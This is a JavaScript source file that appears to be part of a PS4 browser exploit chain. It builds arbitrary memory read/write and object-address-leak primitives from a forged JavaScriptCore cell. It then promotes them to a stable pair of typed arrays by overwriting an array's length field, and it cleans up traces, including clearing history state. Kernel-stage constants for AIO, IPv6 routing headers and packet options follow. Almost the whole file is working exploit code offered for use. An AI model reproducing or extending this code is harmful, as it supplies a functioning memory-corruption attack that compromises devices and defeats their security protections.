    outerGraph = null;
    fillerGraph = null;
    referenceTarget = null;
    keepAlive = null;

    try {
        history.replaceState(null, "");
        report.historyCleared = history.state === null;
    } catch (_) { }

    fakeReleased = true;
    stopped = true;
    running = false;

    retryScheduled = false;
    return report;
}

function fakeCellReleased() {
    return fakeReleased;
}

function carrierHeaderCopy() {
    return rwHeader.slice(0, CELL_BYTES);
}

function carrierHomeVector() {
    return rwOriginalVector;
}



/* === mem.js === */
let carrier = null;

function toI64(x) {
    if (x instanceof int64)
        return x;
    if (typeof x === "number") {
        if (!Number.isFinite(x) || Math.floor(x) !== x || x < 0)
            throw new TypeError(`mem: bad numeric address ${x}`);

        const hi = Math.floor(x / 0x100000000);
        return new int64(x - hi * 0x100000000, hi);
    }
    if (x !== null && typeof x === "object" && "low" in x)
        return new int64(x.low, ("hi" in x) ? x.hi : x.high);
    throw new TypeError("mem: bad address");
}

function addrNumber(x) {
    const a = toI64(x);
    if (a.hi > 0xffff)
        throw new RangeError(`mem: non-canonical address 0x${a.toString()}`);
    return a.hi * 0x100000000 + a.low;
}

function aimFor(addrLike, size) {
    const address = addrNumber(addrLike);
    if (size > carrier.windowBytes)
        throw new RangeError(`mem: ${size} exceeds the ${carrier.windowBytes}-byte window`);
    carrier.aim(address);
    return address;
}

function valueLow32(value, who) {
    if (typeof value === "number") {
        if (!Number.isFinite(value) || Math.floor(value) !== value)
            throw new TypeError(`${who}: non-integer value ${value}`);
        return value >>> 0;
    }
    if (value instanceof int64)
        return value.low >>> 0;
    if (value !== null && typeof value === "object" && "low" in value)
        return toI64(value).low >>> 0;
    throw new TypeError(`${who}: value must be a number or an int64`);
}

function read1(addr) {
    aimFor(addr, 1);
    try {
        return carrier.view[0];
    } finally {
        carrier.restore();
    }
}

function read2(addr) {
    aimFor(addr, 2);
    try {
        const v = carrier.view;
        return v[0] | (v[1] << 8);
    } finally {
        carrier.restore();
    }
}

function read4(addr) {
    aimFor(addr, 4);
    try {
        const v = carrier.view;
        return (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
    } finally {
        carrier.restore();
    }
}

function read8(addr) {
    let lo, hi;
    aimFor(addr, 8);
    try {
        const v = carrier.view;
        lo = (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
        hi = (v[4] | (v[5] << 8) | (v[6] << 16) | (v[7] << 24)) >>> 0;
    } finally {
        carrier.restore();
    }
    return new int64(lo, hi);
}

function write1(addr, value) {
    const v = valueLow32(value, "mem.write1") & 0xff;
    aimFor(addr, 1);
    try {
        carrier.view[0] = v;
    } finally {
        carrier.restore();
    }
}

function write2(addr, value) {
    const v = valueLow32(value, "mem.write2") & 0xffff;
    aimFor(addr, 2);
    try {
        const view = carrier.view;
        view[0] = v & 0xff;
        view[1] = (v >>> 8) & 0xff;
    } finally {
        carrier.restore();
    }
}

function write4(addr, value) {
    const v = valueLow32(value, "mem.write4");
    aimFor(addr, 4);
    try {
        const view = carrier.view;
        view[0] = v & 0xff;
        view[1] = (v >>> 8) & 0xff;
        view[2] = (v >>> 16) & 0xff;
        view[3] = (v >>> 24) & 0xff;
    } finally {
        carrier.restore();
    }
}

function write8(addr, value) {
    let lo, hi;
    if (value instanceof int64) {
        lo = value.low >>> 0;
        hi = value.hi >>> 0;
    } else if (typeof value === "number") {
        if (!Number.isFinite(value) || Math.floor(value) !== value)
            throw new TypeError(`mem.write8: non-integer value ${value}`);
        if (value < 0) {
            if (value < -0x80000000)
                throw new RangeError(`mem.write8: value ${value} below int32 range`);
            lo = value >>> 0;
            hi = 0xffffffff;
        } else if (value <= 0xffffffff) {
            lo = value >>> 0;
            hi = 0;
        } else {
            throw new RangeError(
                `mem.write8: ${value} exceeds 32 bits -- pass an int64`);
        }
    } else if (value !== null && typeof value === "object" && "low" in value) {
        const n = toI64(value);
        lo = n.low; hi = n.hi;
    } else {
        throw new TypeError("mem.write8: value must be int64 or number");
    }

    aimFor(addr, 8);
    try {
        const view = carrier.view;
        view[0] = lo & 0xff;
        view[1] = (lo >>> 8) & 0xff;
        view[2] = (lo >>> 16) & 0xff;
        view[3] = (lo >>> 24) & 0xff;
        view[4] = hi & 0xff;
        view[5] = (hi >>> 8) & 0xff;
        view[6] = (hi >>> 16) & 0xff;
        view[7] = (hi >>> 24) & 0xff;
    } finally {
        carrier.restore();
    }
}

function leakval(obj) {
    if (obj === null || (typeof obj !== "object" && typeof obj !== "function"))
        throw new TypeError("mem.leakval: not an object");

    carrier.setLeakSlot(obj);
    let lo, hi;
    try {

        aimFor(carrier.leakSlotAddress, 8);
        try {
            const v = carrier.view;
            lo = (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
            hi = (v[4] | (v[5] << 8) | (v[6] << 16) | (v[7] << 24)) >>> 0;
        } finally {
            carrier.restore();
        }
    } finally {
        carrier.clearLeakSlot();
    }

    if (hi > 0xffff || (lo === 0 && hi === 0) || (lo & 7) !== 0)
        throw new Error(`mem.leakval: implausible cell 0x${
            new int64(lo, hi).toString()}`);
    return new int64(lo, hi);
}

function readInto(dest, addr, count) {
    const base = addrNumber(addr);
    let done = 0;
    while (done < count) {
        const chunk = Math.min(count - done, carrier.windowBytes);
        aimFor(base + done, chunk);
        try {
            for (let i = 0; i < chunk; ++i)
                dest[done + i] = carrier.view[i];
        } finally {
            carrier.restore();
        }
        done += chunk;
    }
    return dest;
}

const WORKER_BUFFER_SIZE = 0x100;
const PAIR_IDENT_OFFSET = 0x20;
const MAIN_IDENT_OFFSET = 0x40;
const PAIR_HEADER_BYTES = 0x20;
const HOME_BYTE = 0x3c;

const WORKER_LENGTH_MAX = 0xffffffff;

const mainMagic = new Uint8Array([0x63, 0x9e, 0x1f, 0x29, 0xd2, 0x84, 0x0b, 0x5c]);
const workerMagic = new Uint8Array([0x9e, 0x37, 0x79, 0xb9, 0x7f, 0x4a, 0x7c, 0x15]);

const workerHeader = new Uint8Array(PAIR_HEADER_BYTES);
const identityBytes = new Uint8Array(8);
const workerOriginalVector = new Uint8Array(8);
const workerOriginalLength = new Uint8Array(4);
const pairScratch = new ArrayBuffer(8);
const pairScratchBytes = new Uint8Array(pairScratch);
const pairScratchWords = new Uint32Array(pairScratch);

let mainView = null;
let workerBuffer = null;
let workerView = null;
let workerMirror = null;
let pairVectorOffset = -1;
const retained = [];

const pairStatus = {

    state: "not-attempted",
    promoted: false,

    committed: false,
    rolledBack: false,
    rollbackClean: null,
    fallback: false,
    stage: "not-attempted",
    failedAt: null,
    error: null,

    vectorOffset: -1, lengthOffset: -1, modeOffset: -1, butterflyOffset: -1,

    mainAddress: null,
    mainVector: null,

    mainRecordVector: null,
    mainWindow: -1,
    mainCellFromFakeSlot: null,
    mainIdentity: null,
    mainAtHome: null,

    workerAddress: null,
    workerVector: null,
    workerButterfly: null,
    workerWindow: -1,
    workerLength: -1,
    workerIdentity: null,

    structureID: -1, mode: -1, leakvalAgrees: false,

    fakeAddress: null,
    fakeButterfly: null,
    released: []
};

function u32At(bytes, offset) {
    return (bytes[offset] | (bytes[offset + 1] << 8)
        | (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24)) >>> 0;
}

function low48At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000
        + bytes[offset + 4] * 0x100000000
        + bytes[offset + 5] * 0x10000000000;
}

function canonical48(bytes, offset) {
    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

function sameBytes(left, right, count) {
    for (let i = 0; i < count; ++i) {
        if (left[i] !== right[i])
            return false;
    }
    return true;
}

function hexOf(bytes, count) {
    let out = "";
    for (let i = 0; i < count; ++i)
        out += (bytes[i] & 0xff).toString(16).padStart(2, "0");
    return out;
}

function pairAim(address) {
    const high = Math.floor(address / 0x100000000);
    pairScratchWords[0] = address - high * 0x100000000;
    pairScratchWords[1] = high;
    for (let i = 0; i < 8; ++i)
        mainView[pairVectorOffset + i] = pairScratchBytes[i];
}

function pairRestore() {
    for (let i = 0; i < 8; ++i)
        mainView[pairVectorOffset + i] = workerOriginalVector[i];
}

function buildPairCarrier(fake) {
    const validate = fake.validate;
    return {
        aim(address) {
            if (mainView === null || workerView === null)
                throw new Error("mem.pair.aim: the pair has been dropped");
            if (!validate(address))
                throw new RangeError(`mem.pair.aim: implausible address ${address}`);
            pairAim(address);
        },
        restore() {
            if (mainView === null)
                throw new Error("mem.pair.restore: the pair has been dropped");
            pairRestore();
        },
        get view() { return workerView; },

        windowBytes: WORKER_BUFFER_SIZE,

        holder: fake.holder,
        holderAddress: fake.holderAddress,
        leakSlotOffset: fake.leakSlotOffset,
        leakSlotAddress: fake.leakSlotAddress,
        setLeakSlot: fake.setLeakSlot,
        clearLeakSlot: fake.clearLeakSlot,
        anchorObject: fake.anchorObject,
        anchorObjectAddress: fake.anchorObjectAddress,
        textarea: fake.textarea,
        textareaAddress: fake.textareaAddress,

        profile: fake.profile,
        attempts: fake.attempts,
        validate,
        hostAddress: fake.hostAddress,
        fakeAddress: fake.fakeAddress,
        pair: pairStatus,

        assertHome() {
            if (workerView === null || workerMirror === null)
                return false;
            return workerView[0] === HOME_BYTE && workerMirror[0] === HOME_BYTE;
        }
    };
}

function brokenCarrier(why) {
    const die = () => {
        throw new Error("mem: the primitive is disabled -- the promotion failed "
            + `and its rollback did not verify (${why})`);
    };
    return {
        aim: die, restore: die, setLeakSlot: die, clearLeakSlot: die,
        get view() { return die(); },
        get windowBytes() { return die(); },
        get leakSlotAddress() { return die(); },
        validate: () => false,
        assertHome: () => false,
        profile: null,
        pair: pairStatus
    };
}

function proveMagic(note, who, slot, at, expected, context) {
    const target = toI64(at);
    const record = {
        at: target, expected: hexOf(expected, 8), found: null, pass: false
    };
    pairStatus[slot] = record;
    readInto(identityBytes, at, 8);
    record.found = hexOf(identityBytes, 8);
    record.pass = sameBytes(identityBytes, expected, 8);
    note(`PAIR-IDENTITY-${who.toUpperCase()}`,
        `at=0x${target.toString()}-found=${record.found}`
        + `-expected=${record.expected}-pass=${record.pass}-${context}`);
    if (!record.pass)
        throw new Error(`mem.promote: ${who} identity failed -- read `
            + `${record.found} at 0x${target.toString()}, expected `
            + `${record.expected} (${context})`);
    return record;
}

function promoteToRealPair(onEvent) {
    const note = (tag, detail) => {
        pairStatus.stage = tag;
        if (typeof onEvent === "function") {
            try { onEvent(tag, detail === undefined ? "" : String(detail)); }
            catch {  }
        }
    };

    if (pairStatus.promoted)
        throw new Error("mem.promote: already promoted");
    if (carrier === null || typeof carrier.aim !== "function")
        throw new TypeError("mem.promote: no carrier");
    if (fakeCellReleased())
        throw new Error("mem.promote: core.js already released the fake cell");

    const fake = carrier;
    const profile = fake.profile;
    if (!profile || typeof profile.vectorOffset !== "number"
        || typeof profile.butterflyOffset !== "number"
        || typeof profile.inlineSlotOffset !== "number")
        throw new TypeError("mem.promote: carrier has no layout profile");

    if (typeof fake.hostAddress !== "number" || !fake.validate(fake.hostAddress)
        || typeof fake.fakeAddress !== "number" || !fake.validate(fake.fakeAddress)
        || fake.fakeAddress - fake.hostAddress !== profile.inlineSlotOffset)
        throw new TypeError("mem.promote: the fake cell's address is unusable "
            + `(host=${fake.hostAddress} fake=${fake.fakeAddress})`);

    const VECTOR_OFF = profile.vectorOffset;
    const LENGTH_OFF = VECTOR_OFF + 8;
    const MODE_OFF = LENGTH_OFF + 4;
    const BUTTERFLY_OFF = profile.butterflyOffset;
    pairStatus.vectorOffset = VECTOR_OFF;
    pairStatus.lengthOffset = LENGTH_OFF;
    pairStatus.modeOffset = MODE_OFF;
    pairStatus.butterflyOffset = BUTTERFLY_OFF;

    let committed = false;
    let rebound = false;

    try {
        note("PAIR-BEGIN", `window=${fake.windowBytes}-vector=+${VECTOR_OFF}`
            + `-length=+${LENGTH_OFF}-mode=+${MODE_OFF}`);

        const mainRecord = carrierHeaderCopy();
        const mainHomeVector = carrierHomeVector();
        if (!(mainRecord instanceof Uint8Array)
            || mainRecord.length < PAIR_HEADER_BYTES)
            throw new Error("mem.promote: core.js's carrier record is the wrong shape");

        const recordVector = low48At(mainRecord, VECTOR_OFF);
        pairStatus.mainVector = toI64(mainHomeVector);
        pairStatus.mainRecordVector = toI64(recordVector);
        pairStatus.mainWindow = u32At(mainRecord, LENGTH_OFF);
        pairStatus.structureID = u32At(mainRecord, 0);
        note("PAIR-MAIN-RECORD", `home=0x${pairStatus.mainVector.toString()}`
            + `-record=0x${pairStatus.mainRecordVector.toString()}`
            + `-len=${pairStatus.mainWindow}-mode=${mainRecord[MODE_OFF]}`
            + `-sid=0x${(pairStatus.structureID >>> 0).toString(16)}`);

        if (recordVector !== mainHomeVector)
            throw new Error("mem.promote: profile.vectorOffset disagrees with the "
                + `recorded home vector (record 0x${pairStatus.mainRecordVector.toString()}`
                + ` vs home 0x${pairStatus.mainVector.toString()})`);
        if (!fake.validate(mainHomeVector) || mainHomeVector % 8 !== 0)
            throw new Error("mem.promote: the recorded home vector is implausible "
                + `(0x${pairStatus.mainVector.toString()})`);

        if (pairStatus.mainWindow !== fake.windowBytes)
            throw new Error(`mem.promote: the record's m_length (${pairStatus.mainWindow})`
                + ` is not the carrier window (${fake.windowBytes})`
                + " -- LENGTH_OFF does not hold on main");

        mainView = fake.view;
        retained.push(mainView);
        if (!(mainView instanceof Uint8Array)
            || mainView.length !== fake.windowBytes
            || MAIN_IDENT_OFFSET + 8 > fake.windowBytes)
            throw new Error("mem.promote: the carrier's view is not what core.js described");

        pairStatus.fakeAddress = toI64(fake.fakeAddress);
        pairStatus.fakeButterfly = read8(fake.fakeAddress + BUTTERFLY_OFF);
        note("PAIR-FAKE-BUTTERFLY", `host=0x${toI64(fake.hostAddress).toString()}`
            + `-fake=0x${pairStatus.fakeAddress.toString()}`
            + `-butterfly=0x${pairStatus.fakeButterfly.toString()}`);

        workerBuffer = new ArrayBuffer(WORKER_BUFFER_SIZE);
        workerView = new Uint8Array(workerBuffer);
        workerMirror = new Uint8Array(workerBuffer);
        retained.push(workerBuffer, workerView, workerMirror);
        workerMirror[0] = HOME_BYTE;
        for (let i = 0; i < 8; ++i)
            workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];

        if (workerView[0] !== HOME_BYTE)
            throw new Error("mem.promote: workerView does not alias workerMirror");

        for (let i = 0; i < 8; ++i)
            mainView[MAIN_IDENT_OFFSET + i] = mainMagic[i];
        for (let i = 0; i < 8; ++i) {
            if (mainView[MAIN_IDENT_OFFSET + i] !== mainMagic[i])
                throw new Error("mem.promote: main's magic did not read back through "
                    + "its own JS view -- the carrier is not at home");
        }

        const mainAddr = addrNumber(leakval(mainView));
        const workerAddr = addrNumber(leakval(workerView));
        pairStatus.mainAddress = toI64(mainAddr);
        pairStatus.workerAddress = toI64(workerAddr);
        note("PAIR-CELLS", `main=0x${pairStatus.mainAddress.toString()}`
            + `-worker=0x${pairStatus.workerAddress.toString()}`);
        if (mainAddr === workerAddr)
            throw new Error("mem.promote: main and worker leaked the same cell");

        if (mainAddr % 0x10 !== 0 || workerAddr % 0x10 !== 0)
            throw new Error("mem.promote: a leaked cell is not atom-aligned");

        const fromFakeSlot = read8(fake.fakeAddress + VECTOR_OFF);
        pairStatus.mainCellFromFakeSlot = fromFakeSlot;
        note("PAIR-MAIN-CELL", `fake-m_vector=0x${fromFakeSlot.toString()}`
            + `-leakval=0x${pairStatus.mainAddress.toString()}`
            + `-at=0x${toI64(fake.fakeAddress + VECTOR_OFF).toString()}`);
        if (fromFakeSlot.low !== pairStatus.mainAddress.low
            || fromFakeSlot.hi !== pairStatus.mainAddress.hi)
            throw new Error("mem.promote: main CELL identity failed -- the fake "
                + `cell's m_vector slot holds 0x${fromFakeSlot.toString()} but `
                + `leakval(mainView) says 0x${pairStatus.mainAddress.toString()}`);

        proveMagic(note, "main", "mainIdentity",
            mainHomeVector + MAIN_IDENT_OFFSET, mainMagic,
            `home=0x${pairStatus.mainVector.toString()}`
            + `-cell=0x${pairStatus.mainAddress.toString()}`
            + `-offset=+0x${MAIN_IDENT_OFFSET.toString(16)}`);

        readInto(workerHeader, workerAddr, PAIR_HEADER_BYTES);
        const workerVector = low48At(workerHeader, VECTOR_OFF);
        const workerButterfly = low48At(workerHeader, BUTTERFLY_OFF);
        pairStatus.mode = workerHeader[MODE_OFF];
        pairStatus.workerWindow = u32At(workerHeader, LENGTH_OFF);
        pairStatus.workerVector = toI64(workerVector);
        pairStatus.workerButterfly = toI64(workerButterfly);
        note("PAIR-WORKER-HEADER", `sid=0x${u32At(workerHeader, 0).toString(16)}`
            + `-vector=0x${pairStatus.workerVector.toString()}`
            + `-len=${pairStatus.workerWindow}-mode=${pairStatus.mode}`
            + `-butterfly=0x${pairStatus.workerButterfly.toString()}`);

        const gate =
            u32At(workerHeader, 0) === pairStatus.structureID
            && (workerHeader[7] === 0 || workerHeader[7] === 1)
            && pairStatus.workerWindow === WORKER_BUFFER_SIZE

            && workerHeader[MODE_OFF] === mainRecord[MODE_OFF]
            && workerHeader[MODE_OFF + 1] === 0
            && workerHeader[MODE_OFF + 2] === 0
            && workerHeader[MODE_OFF + 3] === 0

            && canonical48(workerHeader, BUTTERFLY_OFF)
            && workerButterfly > 0x100000000 && workerButterfly % 8 === 0

            && canonical48(workerHeader, VECTOR_OFF)
            && fake.validate(workerVector) && workerVector % 8 === 0
            && workerVector !== mainHomeVector;
        if (!gate)
            throw new Error("mem.promote: header gate failed"
                + ` worker-len=${pairStatus.workerWindow}`
                + ` worker-mode=${workerHeader[MODE_OFF]}`
                + ` main-mode=${mainRecord[MODE_OFF]}`
                + ` worker-sid=${u32At(workerHeader, 0)}`
                + ` main-sid=${pairStatus.structureID}`
                + ` worker-vector=0x${pairStatus.workerVector.toString()}`
                + ` worker-butterfly=0x${pairStatus.workerButterfly.toString()}`
                + ` main-home=0x${pairStatus.mainVector.toString()}`);

        proveMagic(note, "worker", "workerIdentity",
            workerVector + PAIR_IDENT_OFFSET, workerMagic,
            `vector=0x${pairStatus.workerVector.toString()}`
            + `-cell=0x${pairStatus.workerAddress.toString()}`
            + `-offset=+0x${PAIR_IDENT_OFFSET.toString(16)}`);
        note("PAIR-IDENTITY", "main-cell=proved-main-buffer=proved-worker=proved");

        for (let i = 0; i < 8; ++i)
            workerOriginalVector[i] = workerHeader[VECTOR_OFF + i];
        for (let i = 0; i < 4; ++i)
            workerOriginalLength[i] = workerHeader[LENGTH_OFF + i];

        note("PAIR-COMMIT", `main=0x${pairStatus.mainAddress.toString()}`
            + `-worker=0x${pairStatus.workerAddress.toString()}`
            + "-next=aim-without-restore");
        aimFor(workerAddr, PAIR_HEADER_BYTES);
        committed = true;
        pairStatus.committed = true;

        for (let i = 0; i < 4; ++i)
            mainView[LENGTH_OFF + i] = 0xff;
        pairStatus.workerLength = workerView.length;

        if (pairStatus.workerLength !== WORKER_LENGTH_MAX)
            throw new Error("mem.promote: the m_length write did not land -- "
                + `worker.length reads ${pairStatus.workerLength}`);
        if (workerMirror.length !== WORKER_BUFFER_SIZE)
            throw new Error("mem.promote: the mirror was widened too -- the write "
                + "went somewhere structural, not to worker's m_length");
        if (workerView[0] !== HOME_BYTE)
            throw new Error("mem.promote: worker no longer sees its own buffer");

        if (mainView[MODE_OFF] !== workerHeader[MODE_OFF]
            || mainView[MODE_OFF + 1] !== 0 || mainView[MODE_OFF + 2] !== 0
            || mainView[MODE_OFF + 3] !== 0)
            throw new Error("mem.promote: m_mode was disturbed by the widening");

        for (let i = 0; i < 8; ++i) {
            if (mainView[VECTOR_OFF + i] !== workerOriginalVector[i])
                throw new Error("mem.promote: worker's m_vector moved during the widening");
        }
        note("PAIR-WIDENED", `length=0x${WORKER_LENGTH_MAX.toString(16)}`
            + `-mode=0x${pairStatus.mode.toString(16)}`);

        pairVectorOffset = VECTOR_OFF;
        carrier = buildPairCarrier(fake);
        rebound = true;

        readInto(identityBytes, workerVector + PAIR_IDENT_OFFSET, 8);
        if (!sameBytes(identityBytes, workerMagic, 8))
            throw new Error("mem.promote: read through the pair returned "
                + `${hexOf(identityBytes, 8)}, expected ${hexOf(workerMagic, 8)}`);
        write8(workerVector + PAIR_IDENT_OFFSET,
            new int64(0x0d0c0b0a, 0x04030201));
        const back = [0x0a, 0x0b, 0x0c, 0x0d, 0x01, 0x02, 0x03, 0x04];
        for (let i = 0; i < 8; ++i) {
            if (workerMirror[PAIR_IDENT_OFFSET + i] !== back[i])
                throw new Error(`mem.promote: write through the pair failed at byte ${i}`);
        }
        for (let i = 0; i < 8; ++i)
            workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];

        const workerAgain = addrNumber(leakval(workerView));
        pairStatus.leakvalAgrees = workerAgain === workerAddr;
        if (!pairStatus.leakvalAgrees)
            throw new Error("mem.promote: leakval through the pair disagrees "
                + `(0x${toI64(workerAgain).toString()} vs `
                + `0x${pairStatus.workerAddress.toString()})`);

        const mv = read8(mainAddr + VECTOR_OFF);
        if (mv.low !== pairStatus.workerAddress.low
            || mv.hi !== pairStatus.workerAddress.hi)
            throw new Error(`mem.promote: main.m_vector reads 0x${mv.toString()},`
                + ` expected worker's cell 0x${pairStatus.workerAddress.toString()}`);
        if (read4(mainAddr + LENGTH_OFF) !== fake.windowBytes)
            throw new Error("mem.promote: main's own m_length was disturbed");
        note("PAIR-REPROVED", `main-m_vector=0x${mv.toString()}`
            + `-leakval=0x${toI64(workerAgain).toString()}`);

        note("PAIR-RELEASE", "next=release-fake-cell-and-debris");
        const rel = releaseFakeCell();
        pairStatus.released = rel.released;
        pairStatus.historyCleared = !!rel.historyCleared;
        if (!fakeCellReleased())
            throw new Error("mem.promote: core.js did not release the fake cell");
        if (fake.assertHome() !== false)
            throw new Error("mem.promote: core.js's carrier still reports itself live");

        pairStatus.promoted = true;
        pairStatus.state = "pair";
        pairStatus.error = null;
        note("PAIR-UP", `main=0x${pairStatus.mainAddress.toString()}`
            + `-worker=0x${pairStatus.workerAddress.toString()}`
            + `-home=0x${pairStatus.mainVector.toString()}`
            + `-mode=0x${pairStatus.mode.toString(16)}`
            + `-sid=0x${pairStatus.structureID.toString(16)}`
            + `-released=${pairStatus.released.length}`
            + `-history-cleared=${pairStatus.historyCleared}`);
        return pairStatus;

    } catch (error) {

        pairStatus.failedAt = pairStatus.stage;
        pairStatus.error = `${error && error.name}: ${String(error && error.message)}`;

        let clean = true;
        if (committed) {
            pairStatus.rolledBack = true;
            try {
                for (let i = 0; i < 8; ++i)
                    mainView[VECTOR_OFF + i] = workerOriginalVector[i];
                for (let i = 0; i < 4; ++i)
                    mainView[LENGTH_OFF + i] = workerOriginalLength[i];
            } catch { clean = false; }
            try { fake.restore(); } catch { clean = false; }

            try {
                if (!(workerView.length === WORKER_BUFFER_SIZE
                    && workerMirror.length === WORKER_BUFFER_SIZE
                    && workerView[0] === HOME_BYTE
                    && fake.assertHome() === true))
                    clean = false;
            } catch { clean = false; }
            pairStatus.rollbackClean = clean;
        }

        try { pairStatus.mainAtHome = fake.assertHome(); }
        catch { pairStatus.mainAtHome = null; }

        pairStatus.promoted = false;
        pairStatus.fallback = true;
        pairStatus.state = (committed && !clean) ? "broken" : "fake";
        if (pairStatus.state === "broken")
            carrier = brokenCarrier(pairStatus.error);
        else if (rebound)
            carrier = fake;

        pairVectorOffset = -1;

        workerView = null;
        workerMirror = null;
        workerBuffer = null;
        mainView = null;
        note("PAIR-FALLBACK", `state=${pairStatus.state}`
            + `-committed=${committed}-rollback-clean=${pairStatus.rollbackClean}`
            + `-main-at-home=${pairStatus.mainAtHome}`
            + `-at=${pairStatus.failedAt}-${pairStatus.error}`);
        throw error;
    }
}

function installWindowP(c, options) {
    if (!c || typeof c.aim !== "function")
        throw new TypeError("mem: not a carrier");
    carrier = c;

    const prim = {
        read1, read2, read4, read8,
        write1, write2, write4, write8,
        leakval
    };
    globalThis.p = prim;

    const opts = options || {};
    if (opts.promote === false) {
        pairStatus.state = "disabled";
        pairStatus.stage = "disabled";
        pairStatus.error = "promotion disabled by the caller (negative control)";
        return prim;
    }

    try {
        promoteToRealPair(opts.onEvent);
    } catch {

        if (pairStatus.state === "broken") {
            globalThis.p = undefined;
            throw new Error("mem: the promotion failed AND its rollback did not "
                + "verify -- window.p has been WITHDRAWN rather than published "
                + `mis-aimed. failedAt=${pairStatus.failedAt} ${pairStatus.error}`);
        }
    }
    return prim;
}



/* === chain === */
const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];

function post(tag, detail) {
    try {
        const x = new XMLHttpRequest();
        x.open("POST", "t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-S4Q&tag=" + encodeURIComponent(tag)
             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}

const VERBOSE = new URLSearchParams(location.search).get("verbose") === "1";

const PROSE = [
    / -- /, /\.\s/, /,\s+(which|so|and that|because|since|as that)\s/,
    /,\s+\w+\s+of\s+which\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the|with the aim)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = function (t) {
        return String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;")
                        .replace(/>/g, "&gt;");
    };
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|MISMATCH|WRONG|MISSING|TIMEOUT|NOT-FOUND/i.test(l) ? "bad"
                : /SKIP|GAP|WOULD-HAVE-WON|WARN/i.test(l) ? "warn"
                : /OK|PROVEN|READY|pass|BASELINE/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, detail);
}
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }

let passCount = 0, failCount = 0;
function check(name, ok, detail) {
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}
function plausibleBase(v) { return v.hi > 0 && (v.low & 0x3fff) === 0; }
function hexByte(b) { return (b < 16 ? "0" : "") + (b & 0xff).toString(16); }
function hexBytes(a) {
    let s = "";
    for (let i = 0; i < a.length; ++i) s += (i ? " " : "") + hexByte(a[i]);
    return s;
}
function put(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}
function sameI64(a, b) { return a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0; }

function inImageAddr(v) { return !!v && (v.hi >>> 0) === 0xffffffff; }
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const AF_INET = 2, SOCK_STREAM = 1;
const SOL_SOCKET = 0xffff, SO_REUSEADDR = 4, SO_LINGER = 0x80;
const IPPROTO_TCP = 6, TCP_INFO = 32, TCP_INFO_SIZE = 0xec, TCPS_ESTABLISHED = 4;
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
const AIO_CMD_READ = 1, AIO_CMD_MULTI = 0x1000, AIO_PRIORITY_HIGH = 3;
const AIO_STATE_COMPLETE = 3, AIO_STATE_ABORTED = 4;
const NUM_REQS = 3, WORKER_NUM = 2, AIO_MAX_NUM = 0x80;
const AIO_RW_REQ_SIZE = 0x28, AIO_RW_REQ_NBYTE = 0x08, AIO_RW_REQ_FD = 0x20;
const MAIN_CORE = 7, RTP = 0x100, RTP_PRIO_REALTIME = 2;
const RTP_LOOKUP = 0, RTP_SET = 1;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = 0xa;
const SENT_LO = 0xc0de4e01, SENT_HI = 0x4eecafe0;
const AF_INET6 = 28, SOCK_DGRAM = 2;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const IPV6_SOCK_NUM = 0x80;
const RTHDR_SIZE = 0x80;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const IPV6_2292PKTOPTIONS = 25, IPV6_TCLASS = 61;
const IPV6_PKTINFO = 46, IPV6_NEXTHOP = 48;

const SO_SNDBUF = 0x1001, SO_RCVBUF = 0x1002;
const PEER_RCVBUF = 0x400, CLIENT_SNDBUF = 0x8000;

const PKTOPTS_PKTINFO = 0x10, PKTOPTS_TCLASS = 0xb0;
const KARW_MARKER = 0x1337;
const MARK_RELEASED = 0x5747e180;

const REQS3_OFF = 0x28;
const AR3_NUM_REQS = 0x00, AR3_REQS_LEFT = 0x04, AR3_STATE = 0x08;
const AR3_DONE = 0x0c, AR3_LOCK_FLAGS = 0x28, AR3_LOCK = 0x38;
const AIO_CMD_WRITE = 2;
const HANDLES_NUM = 0x100;
const LEAK_NUM_REQS = 6;
const EVF_ATTEMPTS = 0x80;

const AR2_CMD = 0x00, AR2_TICKET = 0x04, AR2_REQS1 = 0x10, AR2_INFO = 0x18;
const AR2_BATCH = 0x20, AR2_RESULT_RV = 0x30, AR2_RESULT_STATE = 0x38;
const AR2_RESULT_PAD = 0x3c, AR2_FILE = 0x40, AR2_UNK2 = 0x48;
